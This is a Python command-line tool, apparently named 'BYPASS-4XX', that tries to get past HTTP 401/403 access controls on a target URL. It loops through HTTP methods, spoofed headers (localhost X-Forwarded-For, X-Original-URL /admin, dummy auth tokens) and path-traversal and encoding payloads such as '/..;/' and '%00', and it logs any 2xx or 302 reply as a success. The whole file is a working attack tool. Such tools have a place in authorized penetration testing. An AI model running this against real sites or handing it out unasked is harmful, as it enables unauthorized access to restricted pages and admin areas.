import requests
from itertools import product
import random
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
from colorama import Fore, Style, init
import argparse
import pyfiglet
import base64

# Initialize color output
init(autoreset=True)


# Print banner
def print_banner():
    banner = pyfiglet.figlet_format("BYPASS-4XX")
    author = "By Ram"
    print(Fore.RED + banner)
    print(Fore.CYAN + author.center(50))


# Argument Parser
parser = argparse.ArgumentParser(description="Advanced 4xx Bypass Tool")
parser.add_argument("-of", "--outputfile", type=str, required=True, help="Specify output file name (e.g., results.txt)")
args = parser.parse_args()

# Input Target URL and Path
url = input("Enter the target URL: ")
target_path = input("Enter the target path (e.g., .htaccess, admin, etc.): ")
full_url = f"{url.rstrip('/')}/{target_path.lstrip('/')}"

# Headers List
headers_list = [
    {"Referer": "https://google.com"},
    {"User-Agent": "Googlebot"},
    {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"},
    {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"},
    {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64)"},
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Forwarded-For": "192.168.1.1"},
    {"X-Real-IP": "127.0.0.1"},
    {"X-Originating-IP": "127.0.0.1"},
    {"Authorization": "Basic dXNlcjpwYXNz"},
    {"Authorization": "Bearer dummy_token"},
    {"X-Original-URL": "/admin"},
    {"X-Custom-IP-Authorization": "127.0.0.1"},
    {"X-Rewrite-URL": "/admin"}
]

# HTTP Methods
methods = ["GET", "HEAD", "OPTIONS", "TRACE", "PROPFIND", "POST", "DELETE", "PUT"]

# Payloads for Bypass
payloads = list(set([  # Remove duplicate payloads
    "%2e", "%252e", "/..;/", "/;/", "/./.", "%00", "%2f", "%5c", "..%2f", "..%5c", "..;", "//", "~",
    target_path.upper(), target_path.lower(), target_path.capitalize(),
    f"{target_path}%00",
    f"{target_path.encode('utf-8').hex()}",
    base64.b64encode(target_path.encode()).decode()
]))

# Output File
log_file = args.outputfile
with open(log_file, "w") as f:
    f.write("Bypass Testing Results\n\n")

# Store unique successful attempts
successful_attempts = set()


# Function to log successful bypass attempts
def log_success(method, test_url, headers, payload, status):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    formatted_message = f"[{timestamp}] SUCCESS: {test_url} | Method: {method} | Status: {status} | Header: {headers} | Payload: {payload}"

    if test_url not in successful_attempts:
        print(Fore.GREEN + formatted_message + Style.RESET_ALL)
        with open(log_file, "a") as f:
            f.write(formatted_message + "\n")
        successful_attempts.add(test_url)


# Function to send request and test for bypass
def test_request(method, test_url, headers, payload):
    try:
        response = requests.request(method, test_url, headers=headers, allow_redirects=False)
        status = response.status_code

        if status in [200, 201, 202, 204, 302]:  # Successful bypass status codes
            log_success(method, test_url, headers, payload, status)
        else:
            print(Fore.RED + f"FAILED: {test_url} | Method: {method} | Status: {status}" + Style.RESET_ALL)
    except requests.exceptions.RequestException:
        print(Fore.YELLOW + f"ERROR: Could not connect to {test_url}" + Style.RESET_ALL)


# Main function to perform testing
def test_bypass():
    print_banner()
    with ThreadPoolExecutor(max_workers=10) as executor:
        for method, headers in product(methods, headers_list):
            headers = random.choice(headers_list)  # Randomize headers for each request
            for payload in payloads:
                test_url = f"{full_url}{payload}"
                executor.submit(test_request, method, test_url, headers, payload)


if __name__ == "__main__":
    test_bypass()
    print(f"{Fore.GREEN}Results saved to {log_file}{Style.RESET_ALL}")
